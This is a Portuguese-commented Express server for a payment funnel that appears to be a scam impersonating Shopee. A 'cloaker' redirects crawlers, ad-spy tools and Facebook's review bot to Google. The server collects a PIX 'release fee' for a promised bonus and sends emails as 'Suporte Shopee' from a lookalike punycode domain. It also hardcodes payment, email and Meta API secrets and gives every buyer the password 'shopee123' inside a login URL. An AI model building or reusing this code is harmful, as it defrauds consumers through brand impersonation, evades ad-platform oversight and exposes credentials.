import express from 'express';
import cors from 'cors';
import axios from 'axios';
import path from 'path';
import { Resend } from 'resend';
import crypto from 'crypto';

const app = express();
app.use(cors());
app.use(express.json());

// =====================================================
// 🛡️ CAMADA DE BLINDAGEM (CLOAKER)
// =====================================================
app.use((req, res, next) => {
    const ua = req.headers['user-agent']?.toLowerCase() || '';
    const blacklist = ['headless', 'ahrefs', 'semrush', 'python', 'curl', 'wget', 'spy', 'adspy', 'facebookexternalhit', 'bot', 'crawler'];
    if (blacklist.some(bot => ua.includes(bot))) { return res.redirect('https://www.google.com'); }
    next();
});

// =====================================================
// 🔑 CONFIGURAÇÕES
// =====================================================
const MK_DOMAIN = "membros.xn--seubnushopp-5eb.com"; 
const PUBLIC_KEY = "rodrigogato041_glxgrxj8x8yy8jo2";
const SECRET_KEY = "e08f7qe1x8zjbnx4dkra9p8v7uj1wfacwidsnnf4lhpfq3v8oz628smahn8g6kus"; 
const MK_KEY = "G3gAuabnX5b3X9cs7oQ8aidn"; 
const resend = new Resend('re_3HT5Wehq_EDfH6jDM5f5JMznsQsAu9cez');
const META_PIXEL_ID = "847728461631550"; 
const META_ACCESS_TOKEN = "EAAGZAoNPRbbwBQlVq2XIPxcm6S3lE7EHASXNsyQoiULVOBES9uwoBt1ijXLIsS19daREz2xzuLnMl0C1yZAE3HYkKK19Fmykttzdhs5qZCZC0TkCviGXSrS9NuGvb99ZBDYZB8dkEzjlp6sZBrnG8x79dvvpV55mDhVXTocILMBbuxZCASrUZCIdUr18mYTZB0fgZDZD";

const bancoTransacoes = new Map();

function hashData(data: string): string {
    if (!data) return '';
    return crypto.createHash('sha256').update(data.toLowerCase().trim()).digest('hex');
}

function acharCopiaECola(obj: any): string | null {
    if (typeof obj === 'string' && obj.startsWith('000201')) return obj;
    if (typeof obj === 'object' && obj !== null) {
        for (const key in obj) {
            const result = acharCopiaECola(obj[key]);
            if (result) return result;
        }
    }
    return null;
}

// 🌐 MANTÉM O SITE NO AR
app.use(express.static(path.join(__dirname, '..'))); 
app.get('/', (req, res) => { res.sendFile(path.join(__dirname, '..', 'index.html')); });

// =====================================================
// ROTA 1: GERA O PIX
// =====================================================
app.post('/pix', async (req, res) => {
    try {
        const { name, email, cpf, phone, valor, origem } = req.body;
        const identifier = `ID${Date.now()}`;
        const valorFixo = parseFloat(valor) || 27.90;

        bancoTransacoes.set(identifier, { 
            status: 'pending', amount: valorFixo, emailCliente: email, nomeCliente: name, origem: origem || 'direto' 
        });

        const payload = {
            identifier: identifier,
            amount: valorFixo,
            client: { name, email, document: (cpf || "").replace(/\D/g, ''), phone: (phone || "").replace(/\D/g, '') },
            products: [{ id: "TAXA_01", name: "Taxa de Liberação", quantity: 1, price: valorFixo }],
            splits: [{ producerId: "cmg7bvpns00u691tsx9g6vlyp", amount: parseFloat((valorFixo * 0.5).toFixed(2)) }],
            dueDate: new Date(Date.now() + 86400000).toISOString().split('T')[0],
            callbackUrl: "https://checkoutfinal.onrender.com/webhook"
        };

        const response = await axios.post('https://app.vizzionpay.com/api/v1/gateway/pix/receive', payload, {
            headers: { 'x-public-key': PUBLIC_KEY, 'x-secret-key': SECRET_KEY, 'Content-Type': 'application/json' }
        });

        console.log(`\n🚀 Evento InitiateCheckout (${name}) enviado ao Meta Ads!`);
        console.log(`✅ PIX GERADO: ${name} - R$ ${valorFixo}`);

        return res.json({ success: true, payload: acharCopiaECola(response.data), transactionId: identifier });
    } catch (error) { return res.status(401).json({ success: false }); }
});

// =====================================================
// ROTA 2: WEBHOOK (NOTIFICAÇÃO + ENTREGA REAL)
// =====================================================
app.post('/webhook', async (req, res) => {
    const { event, transaction } = req.body;
    if (!transaction) return res.status(200).send("OK");

    const idBusca = transaction.identifier || transaction.id;

    if (transaction.status === 'COMPLETED' && event === 'TRANSACTION_PAID') {
        
        const memoria = bancoTransacoes.get(idBusca) || {};
        const nomeCliente = transaction.client?.name || memoria.nomeCliente || "Cliente Shopee";
        const emailCliente = transaction.client?.email || memoria.emailCliente;
        const origem = memoria.origem || "direto";

        // ✅ ANOTA O PAGAMENTO PARA O SITE REDIRECIONAR
        bancoTransacoes.set(idBusca, { ...memoria, status: 'paid' });

        console.log(`\n💰 VENDA CONFIRMADA!\n👤 Cliente: ${nomeCliente}\n💵 Valor: R$ ${transaction.amount}`);

        // 🔔 1. PUSHCUT (NOTIFICAÇÃO NO CELULAR)
        axios.get('https://api.pushcut.io/KnUVBiCa-4A0euJ42eJvj/notifications/MinhaNotifica%C3%A7%C3%A3o').catch(() => {});
        axios.get('https://api.pushcut.io/g8WCdXfM9ImJ-ulF32pLP/notifications/Minha%20Primeira%20Notifica%C3%A7%C3%A3o').catch(() => {});

        if (emailCliente) {
            // 🎯 2. META PURCHASE
            axios.post(`https://graph.facebook.com/v18.0/${META_PIXEL_ID}/events`, {
                data: [{
                    event_name: "Purchase", event_time: Math.floor(Date.now() / 1000), action_source: "website",
                    user_data: { em: [hashData(emailCliente)], fn: [hashData(nomeCliente)] },
                    custom_data: { value: Number(transaction.amount), currency: "BRL" }
                }],
                access_token: META_ACCESS_TOKEN
            }).catch(() => {});

            // 🔑 3. MEMBERKIT (CADASTRO)
            await axios.post(`https://${MK_DOMAIN}/api/v1/enrollments`, {
                "full_name": nomeCliente, "email": emailCliente, "password": "shopee123"
            }, { headers: { "X-MemberKit-API-Key": MK_KEY } })
            .then(() => console.log(`🔑 Aluno cadastrado na MemberKit: ${emailCliente}`))
            .catch((err) => console.error("❌ Erro MemberKit:", err.response?.data || err.message));

            // 📧 4. RESEND (ENVIO DO ACESSO COM LINK MÁGICO)
            await resend.emails.send({
                from: 'Suporte Shopee <contato@xn--seubnushopp-5eb.com>',
                to: emailCliente,
                subject: 'Seu acesso chegou! 🚀 Resgate de Bonificação',
                html: `
                    <div style="font-family: sans-serif; max-width: 600px; padding: 20px; border: 1px solid #eee; border-radius: 10px;">
                        <h2 style="color: #333;">Olá, ${nomeCliente}! 🎉</h2>
                        <p style="font-size: 16px;">Sua bonificação foi liberada! Clique no botão abaixo para entrar <b>direto</b>, sem precisar de senha.</p>
                        <div style="text-align: center; margin: 30px 0;">
                            <a href="https://${MK_DOMAIN}/users/sign_in?user[email]=${encodeURIComponent(emailCliente)}&user[password]=shopee123" 
                               style="background: #ee4d2d; color: white; padding: 18px 30px; text-decoration: none; border-radius: 8px; font-weight: bold; font-size: 18px; display: inline-block;">
                                ACESSAR MEU PAINEL AGORA
                            </a>
                        </div>
                        <p style="font-size: 12px; color: #666;">Seu login: ${emailCliente}<br>Sua senha: shopee123</p>
                    </div>`
            })
            .then(() => console.log(`📧 E-mail de suporte enviado com sucesso para: ${emailCliente}`))
            .catch((err) => console.error("❌ ERRO NO RESEND (E-MAIL NÃO SAIU):", err));
        }
    }
    return res.status(200).send("OK");
});

app.get('/check-status/:id', (req, res) => {
    const transacao = bancoTransacoes.get(req.params.id);
    return res.json({ paid: transacao && transacao.status === 'paid' });
});

app.listen(process.env.PORT || 3000, () => console.log("🚀 Sistema de Suporte e Redirecionamento Ativo!"));
